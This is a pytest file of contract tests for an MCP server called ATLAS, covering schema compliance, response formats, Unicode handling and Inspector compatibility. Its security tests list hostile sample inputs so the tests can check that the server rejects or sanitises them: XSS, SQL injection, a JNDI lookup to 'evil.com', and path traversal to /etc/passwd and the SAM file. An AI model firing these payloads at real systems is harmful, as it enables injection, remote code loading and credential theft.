"""
Contract tests for ATLAS MCP Server - MCP Protocol Compliance Testing
Testing adherence to MCP specification, schema validation, and protocol compliance.
"""

import pytest
import json
import jsonschema
from typing import Dict, Any, List
from unittest.mock import Mock, AsyncMock

from mcp.types import (
    Resource, Tool, Prompt, TextContent, ImageContent,
    CallToolRequest, CallToolResult, ListResourcesResult,
    ListToolsResult, ListPromptsResult, ReadResourceRequest
)

from src.atlas_commands.server import EnhancedAtlasCommandsServer


class TestMCPProtocolCompliance:
    """Test compliance with MCP protocol specification."""
    
    @pytest.fixture
    def mcp_server(self):
        """Create MCP server for protocol compliance testing."""
        return EnhancedAtlasCommandsServer()
    
    @pytest.fixture
    def mcp_tool_schema(self):
        """MCP Tool schema for validation."""
        return {
            "type": "object",
            "required": ["name", "description", "inputSchema"],
            "properties": {
                "name": {
                    "type": "string",
                    "pattern": "^[a-zA-Z_][a-zA-Z0-9_]*$"
                },
                "description": {
                    "type": "string",
                    "minLength": 1
                },
                "inputSchema": {
                    "type": "object",
                    "required": ["type"],
                    "properties": {
                        "type": {"const": "object"},
                        "properties": {"type": "object"},
                        "required": {
                            "type": "array",
                            "items": {"type": "string"}
                        }
                    }
                }
            }
        }
    
    @pytest.fixture
    def mcp_resource_schema(self):
        """MCP Resource schema for validation."""
        return {
            "type": "object",
            "required": ["uri", "name"],
            "properties": {
                "uri": {
                    "type": "string",
                    "format": "uri"
                },
                "name": {
                    "type": "string",
                    "minLength": 1
                },
                "description": {"type": "string"},
                "mimeType": {"type": "string"}
            }
        }
    
    def test_tool_definition_schema_compliance(self, mcp_server, mcp_tool_schema):
        """Test that all tool definitions comply with MCP schema."""
        tools = mcp_server.get_tool_definitions()
        
        assert isinstance(tools, list)
        assert len(tools) > 0
        
        for tool in tools:
            # Validate against MCP tool schema
            try:
                jsonschema.validate(tool, mcp_tool_schema)
            except jsonschema.ValidationError as e:
                pytest.fail(f"Tool '{tool.get('name', 'unknown')}' fails MCP schema validation: {e}")
            
            # Additional MCP-specific validations
            assert isinstance(tool['name'], str)
            assert len(tool['name']) > 0
            assert tool['name'].replace('_', '').isalnum()  # Valid identifier
            
            assert isinstance(tool['description'], str)
            assert len(tool['description']) > 10  # Meaningful description
            
            # Input schema validation
            input_schema = tool['inputSchema']
            assert input_schema['type'] == 'object'
            
            if 'required' in input_schema:
                assert isinstance(input_schema['required'], list)
                for req_field in input_schema['required']:
                    assert req_field in input_schema.get('properties', {})
    
    @pytest.mark.asyncio
    async def test_resource_definition_schema_compliance(self, mcp_server, mcp_resource_schema):
        """Test that all resource definitions comply with MCP schema."""
        resources = await mcp_server.list_resources()
        
        assert isinstance(resources, list)
        
        for resource in resources:
            # Validate against MCP resource schema
            try:
                jsonschema.validate(resource, mcp_resource_schema)
            except jsonschema.ValidationError as e:
                pytest.fail(f"Resource '{resource.get('name', 'unknown')}' fails MCP schema validation: {e}")
            
            # Additional validations
            assert resource['uri'].startswith(('atlas://', 'file://', 'http://', 'https://'))
            assert len(resource['name']) > 0
    
    @pytest.mark.asyncio
    async def test_tool_call_request_response_format(self, mcp_server):
        """Test tool call request/response format compliance."""
        # Test valid tool call
        valid_request = {
            'name': 'orchestrate_intelligent_tasks',
            'arguments': {
                'task_description': 'Test task for compliance',
                'context': {'domain': 'test'},
                'requirements': {'priority': 'normal'}
            }
        }
        
        response = await mcp_server.call_tool(valid_request)
        
        # Validate response format
        assert isinstance(response, dict)
        assert 'content' in response
        assert isinstance(response['content'], list)
        assert len(response['content']) > 0
        
        # Validate content structure
        for content_item in response['content']:
            assert isinstance(content_item, dict)
            assert 'type' in content_item
            assert content_item['type'] in ['text', 'image', 'resource']
            
            if content_item['type'] == 'text':
                assert 'text' in content_item
                assert isinstance(content_item['text'], str)
    
    def test_tool_name_uniqueness(self, mcp_server):
        """Test that all tool names are unique."""
        tools = mcp_server.get_tool_definitions()
        tool_names = [tool['name'] for tool in tools]
        
        assert len(tool_names) == len(set(tool_names)), "Tool names must be unique"
    
    @pytest.mark.asyncio
    async def test_resource_uri_uniqueness(self, mcp_server):
        """Test that all resource URIs are unique."""
        resources = await mcp_server.list_resources()
        resource_uris = [resource['uri'] for resource in resources]
        
        assert len(resource_uris) == len(set(resource_uris)), "Resource URIs must be unique"
    
    def test_error_handling_format_compliance(self, mcp_server):
        """Test that errors follow MCP error format."""
        # Test invalid tool name
        with pytest.raises(Exception) as exc_info:
            mcp_server.call_tool_sync({'name': 'invalid_tool_name', 'arguments': {}})
        
        # MCP errors should have specific structure
        # This is a placeholder - actual error structure depends on implementation
        assert exc_info.value is not None
    
    @pytest.mark.asyncio
    async def test_content_type_handling(self, mcp_server):
        """Test proper handling of different content types."""
        # Test text content
        text_request = {
            'name': 'analyze_workflow_patterns',
            'arguments': {
                'workflow_data': {'steps': ['analyze', 'design', 'implement']},
                'analysis_depth': 'detailed',
                'optimization_goals': ['efficiency', 'quality']
            }
        }
        
        response = await mcp_server.call_tool(text_request)
        text_content = response['content'][0]
        
        assert text_content['type'] == 'text'
        assert 'text' in text_content
        assert isinstance(text_content['text'], str)
        
        # Ensure text is valid JSON or structured format
        try:
            parsed_content = json.loads(text_content['text'])
            assert isinstance(parsed_content, dict)
        except json.JSONDecodeError:
            # If not JSON, should still be meaningful text
            assert len(text_content['text']) > 0


class TestMCPDataTypeValidation:
    """Test MCP data type validation and serialization."""
    
    def test_tool_input_parameter_types(self):
        """Test tool input parameter type validation."""
        from src.atlas_commands.tools.orchestrate_intelligent_tasks import orchestrate_intelligent_tasks
        
        # Test with valid parameters
        valid_params = {
            'task_description': 'Valid string description',
            'context': {'domain': 'backend', 'team_size': 3},
            'requirements': {'performance': 'high'}
        }
        
        # This should not raise an exception
        result = orchestrate_intelligent_tasks(**valid_params)
        assert result is not None
        
        # Test with invalid parameter types
        invalid_params = [
            {'task_description': None, 'context': {}, 'requirements': {}},
            {'task_description': '', 'context': {}, 'requirements': {}},
            {'task_description': 'valid', 'context': 'invalid_type', 'requirements': {}},
            {'task_description': 'valid', 'context': {}, 'requirements': 'invalid_type'}
        ]
        
        for invalid_param in invalid_params:
            with pytest.raises((TypeError, ValueError, AttributeError)):
                orchestrate_intelligent_tasks(**invalid_param)
    
    def test_response_serialization(self):
        """Test response data serialization compliance."""
        from src.atlas_commands.intelligent_orchestrator import OrchestrationResult
        
        # Create test orchestration result
        result = OrchestrationResult(
            task_analysis={'complexity': 'moderate'},
            coordination_strategy={'pattern': 'workflow'},
            token_optimization={'compression_ratio': 0.25},
            tool_activation={'tools': ['analyzer']},
            automation_strategy={'level': 'high'},
            value_alignment={'score': 0.85},
            execution_sequence=[{'step': 'analyze', 'duration': 2.0}],
            monitoring_framework={'metrics': ['performance']},
            success_metrics={'efficiency': 0.90},
            estimated_efficiency_gain=0.35
        )
        
        # Test JSON serialization
        from dataclasses import asdict
        result_dict = asdict(result)
        
        try:
            json_str = json.dumps(result_dict)
            assert isinstance(json_str, str)
            
            # Test deserialization
            parsed_result = json.loads(json_str)
            assert isinstance(parsed_result, dict)
            assert 'task_analysis' in parsed_result
            assert 'estimated_efficiency_gain' in parsed_result
            
        except (TypeError, ValueError) as e:
            pytest.fail(f"OrchestrationResult serialization failed: {e}")
    
    def test_unicode_and_special_character_handling(self):
        """Test handling of Unicode and special characters."""
        from src.atlas_commands.task_analysis_algorithm import analyze_task_for_atlas_framework
        
        test_cases = [
            "Implement API with émojis 🚀 and spëcial châractérs",
            "处理中文任务描述的能力测试",
            "Тест русского текста в описании задачи",
            "Task with special chars: @#$%^&*()[]{}|\\;':\"<>?/",
            "Multi\nline\ttask\rdescription"
        ]
        
        for task_description in test_cases:
            try:
                result = analyze_task_for_atlas_framework(
                    task_description,
                    {'domain': 'unicode_test'}
                )
                
                assert result is not None
                assert 'task_description' in result
                assert result['task_description'] == task_description
                
                # Ensure result can be JSON serialized
                json_str = json.dumps(result, ensure_ascii=False)
                assert isinstance(json_str, str)
                
            except Exception as e:
                pytest.fail(f"Unicode handling failed for '{task_description}': {e}")


class TestMCPSecurityCompliance:
    """Test MCP security and validation compliance."""
    
    def test_input_sanitization(self):
        """Test input sanitization and validation."""
        from src.atlas_commands.tools.orchestrate_intelligent_tasks import orchestrate_intelligent_tasks
        
        # Test potentially malicious inputs
        malicious_inputs = [
            {'task_description': '<script>alert("xss")</script>', 'context': {}, 'requirements': {}},
            {'task_description': 'DROP TABLE users;--', 'context': {}, 'requirements': {}},
            {'task_description': '${jndi:ldap://evil.com/a}', 'context': {}, 'requirements': {}},
            {'task_description': '../../../etc/passwd', 'context': {}, 'requirements': {}},
            {'task_description': 'a' * 10000, 'context': {}, 'requirements': {}}  # Very long input
        ]
        
        for malicious_input in malicious_inputs:
            try:
                result = orchestrate_intelligent_tasks(**malicious_input)
                
                # Result should be properly sanitized
                assert result is not None
                
                # Check that malicious content is not echoed back unsanitized
                if isinstance(result, dict):
                    result_str = json.dumps(result)
                    assert '<script>' not in result_str
                    assert 'DROP TABLE' not in result_str.upper()
                    assert '${jndi:' not in result_str
                    
            except (ValueError, TypeError):
                # Rejection of malicious input is acceptable
                pass
    
    def test_resource_access_control(self, mcp_server):
        """Test resource access control and path traversal prevention."""
        # Test valid resource access
        try:
            resources = mcp_server.list_resources_sync()
            assert isinstance(resources, list)
        except Exception as e:
            pytest.fail(f"Valid resource listing failed: {e}")
        
        # Test invalid resource access attempts
        invalid_uris = [
            '../../../etc/passwd',
            'file:///etc/passwd',
            '\\..\\..\\windows\\system32\\config\\sam',
            'atlas://../../../secret',
            'http://evil.com/malicious'
        ]
        
        for invalid_uri in invalid_uris:
            with pytest.raises(Exception):
                mcp_server.read_resource_sync(invalid_uri)
    
    def test_rate_limiting_compliance(self, mcp_server):
        """Test rate limiting and DoS protection."""
        # Simulate rapid requests
        request_count = 100
        start_time = time.time()
        
        successful_requests = 0
        for i in range(request_count):
            try:
                tools = mcp_server.get_tool_definitions()
                if tools:
                    successful_requests += 1
            except Exception:
                # Rate limiting or protection kicked in
                pass
        
        end_time = time.time()
        requests_per_second = successful_requests / (end_time - start_time)
        
        # Should handle reasonable request rate
        assert requests_per_second > 10  # At least 10 requests per second
        
        # But should have some protection against abuse
        # (This is implementation-dependent)


class TestMCPInspectorCompatibility:
    """Test compatibility with MCP Inspector tool."""
    
    def test_inspector_tool_listing_format(self, mcp_server):
        """Test tool listing format compatible with MCP Inspector."""
        tools = mcp_server.get_tool_definitions()
        
        # Inspector expects specific format
        for tool in tools:
            # Must have these fields for Inspector compatibility
            assert 'name' in tool
            assert 'description' in tool
            assert 'inputSchema' in tool
            
            # Name should be Inspector-friendly
            assert tool['name'].replace('_', '').replace('-', '').isalnum()
            
            # Description should be helpful for Inspector UI
            assert len(tool['description']) >= 20  # Meaningful description
            assert not tool['description'].startswith('TODO')
            assert not tool['description'].lower().startswith('fix')
            
            # Schema should be Inspector-parseable
            schema = tool['inputSchema']
            assert schema.get('type') == 'object'
            
            if 'properties' in schema:
                for prop_name, prop_def in schema['properties'].items():
                    assert 'type' in prop_def
                    # Should have description for Inspector UI
                    if 'description' not in prop_def:
                        print(f"Warning: Property '{prop_name}' in tool '{tool['name']}' lacks description")
    
    @pytest.mark.asyncio
    async def test_inspector_resource_listing_format(self, mcp_server):
        """Test resource listing format compatible with MCP Inspector."""
        resources = await mcp_server.list_resources()
        
        for resource in resources:
            # Inspector compatibility requirements
            assert 'uri' in resource
            assert 'name' in resource
            
            # URI should be Inspector-parseable
            uri = resource['uri']
            assert any(uri.startswith(scheme) for scheme in ['atlas://', 'file://', 'http://', 'https://'])
            
            # Name should be user-friendly
            assert len(resource['name']) > 0
            assert resource['name'] != resource['uri']  # Should be descriptive
    
    def test_inspector_error_format_compatibility(self, mcp_server):
        """Test error format compatibility with MCP Inspector."""
        # Trigger various error conditions
        error_scenarios = [
            {'name': 'nonexistent_tool', 'arguments': {}},
            {'name': 'orchestrate_intelligent_tasks', 'arguments': {'invalid': 'args'}},
            {'name': 'adaptive_command_selection', 'arguments': {}}  # Missing required args
        ]
        
        for scenario in error_scenarios:
            try:
                mcp_server.call_tool_sync(scenario)
                # If no error, that's fine too
            except Exception as e:
                # Error should be Inspector-friendly
                error_message = str(e)
                assert len(error_message) > 0
                assert not error_message.startswith('Traceback')  # Should be clean error
                assert 'tool' in error_message.lower() or 'argument' in error_message.lower()


import time  # Add missing import

if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])